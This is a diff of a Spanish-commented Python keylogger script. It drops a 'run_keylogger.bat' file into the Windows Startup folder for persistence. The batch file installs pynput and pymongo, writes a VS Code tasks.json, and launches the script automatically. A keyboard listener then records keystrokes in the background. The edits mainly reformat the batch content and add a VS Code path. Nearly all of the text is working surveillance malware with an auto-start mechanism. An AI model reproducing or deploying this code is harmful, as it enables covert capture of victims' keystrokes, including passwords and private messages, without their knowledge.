@@ -11,61 +11,64 @@ current_script = os.path.abspath(__file__)
 startup_folder = os.getenv('APPDATA') + r'\Microsoft\Windows\Start Menu\Programs\Startup'
 bat_file_path = os.path.join(startup_folder, 'run_keylogger.bat')
 
+# Definir la ruta a Visual Studio Code
+vscode_path = r"C:\Users\yo\AppData\Local\Programs\Microsoft VS Code\Code.exe"  # Cambia a la ruta correcta de tu VS Code
+
 def create_startup_file():
-    # Contenido del archivo .bat actualizado para abrir y ejecutar el script en VS Code
+    # Contenido del archivo .bat
     bat_content = f'''@echo off
-        rem Verificar si Python está instalado
-        where python >nul 2>nul
-        if %ERRORLEVEL% neq 0 (
-            echo Python no está instalado. Por favor, instale Python.
-            exit /b
-        )
+rem Verificar si Python está instalado
+where python >nul 2>nul
+if %ERRORLEVEL% neq 0 (
+    echo Python no está instalado. Por favor, instale Python.
+    exit /b
+)
 
-        rem Instalar las dependencias necesarias
-        python -m pip install --upgrade pip
-        pip install pynput pymongo
+rem Instalar las dependencias necesarias
+python -m pip install --upgrade pip
+pip install pynput pymongo
 
-        rem Verificar si Visual Studio Code está instalado
-        if not exist "{vscode_path}" (
-            echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
-            exit /b
-        )
+rem Verificar si Visual Studio Code está instalado
+if not exist "{vscode_path}" (
+    echo Visual Studio Code no está instalado. Por favor, instale Visual Studio Code.
+    exit /b
+)
 
-        rem Ruta del script Python
-        set "PYTHON_SCRIPT={current_script}"
+rem Ruta del script Python
+set "PYTHON_SCRIPT={current_script}"
 
-        rem Crear un archivo tasks.json para ejecutar el script en VS Code
-        echo {{ > "%USERPROFILE%\\.vscode\\tasks.json"
-        echo   "version": "2.0.0", >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo   "tasks": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo     {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "label": "Run Python Script", >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "type": "shell", >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "command": "python", >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "args": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo         "%PYTHON_SCRIPT%" >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       ], >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "group": {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo         "kind": "build", >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo         "isDefault": true >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       }}, >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo       "problemMatcher": [] >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo     }} >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo   ] >> "%USERPROFILE%\\.vscode\\tasks.json"
-        echo }} >> "%USERPROFILE%\\.vscode\\tasks.json"
+rem Crear un archivo tasks.json para ejecutar el script en VS Code
+echo {{ > "%USERPROFILE%\\.vscode\\tasks.json"
+echo   "version": "2.0.0", >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo   "tasks": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo     {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "label": "Run Python Script", >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "type": "shell", >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "command": "python", >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "args": [ >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo         "%PYTHON_SCRIPT%" >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       ], >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "group": {{ >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo         "kind": "build", >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo         "isDefault": true >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       }}, >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo       "problemMatcher": [] >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo     }} >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo   ] >> "%USERPROFILE%\\.vscode\\tasks.json"
+echo }} >> "%USERPROFILE%\\.vscode\\tasks.json"
 
-        rem Abrir Visual Studio Code y el script
-        start "" "{vscode_path}" "{current_script}"
+rem Abrir Visual Studio Code y el script
+start "" "{vscode_path}" "{current_script}"
 
-        rem Espera a que VS Code abra el archivo
-        timeout /t 5 /nobreak
+rem Espera a que VS Code abra el archivo
+timeout /t 5 /nobreak
 
-        rem Ejecutar el script en la terminal integrada de VS Code usando un comando VS Code específico
-        "{vscode_path}" --folder-uri "{current_script}" -r -g -n
-        "{vscode_path}" --install-extension ms-python.python --force
-        "{vscode_path}" --command "workbench.action.terminal.runActiveFile"
+rem Ejecutar el script en la terminal integrada de VS Code usando un comando VS Code específico
+"{vscode_path}" --folder-uri "{current_script}" -r -g -n
+"{vscode_path}" --install-extension ms-python.python --force
+"{vscode_path}" --command "workbench.action.terminal.runActiveFile"
 
-        exit
+exit
 '''
 
     with open(bat_file_path, 'w') as bat_file:
@@ -115,6 +118,7 @@ def main():
     # Escuchar las teclas en segundo plano
     with keyboard.Listener(on_press=on_press) as listener:
         listener.join()
+
 
 if __name__ == "__main__":
     # Crear el archivo de inicio solo la primera vez
